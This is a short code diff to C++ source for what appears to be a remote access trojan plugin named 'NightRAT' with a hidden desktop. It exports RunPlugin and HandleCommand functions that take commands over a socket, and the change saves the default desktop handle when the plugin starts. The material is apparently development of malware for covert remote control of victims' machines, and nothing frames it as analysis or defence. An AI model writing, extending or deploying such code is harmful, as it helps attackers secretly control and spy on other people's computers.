@@ -75,6 +75,7 @@ static int g_scalePercent = 50;
 static int g_targetFps = 10;
 
 static HDESK g_hHiddenDesktop = NULL;
+static HDESK g_hDefaultDesktop = NULL;
 static wstring g_desktopName = L"NightRAT_HiddenDesktop";
 
 static mutex g_gdiplusMutex;
@@ -1304,6 +1305,9 @@ static wstring utf8_to_wstring(const string& str) {
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     initialize_visual_styles();
     g_socket = sock;
+    if (!g_hDefaultDesktop) {
+        g_hDefaultDesktop = GetThreadDesktop(GetCurrentThreadId());
+    }
 }
 
 extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
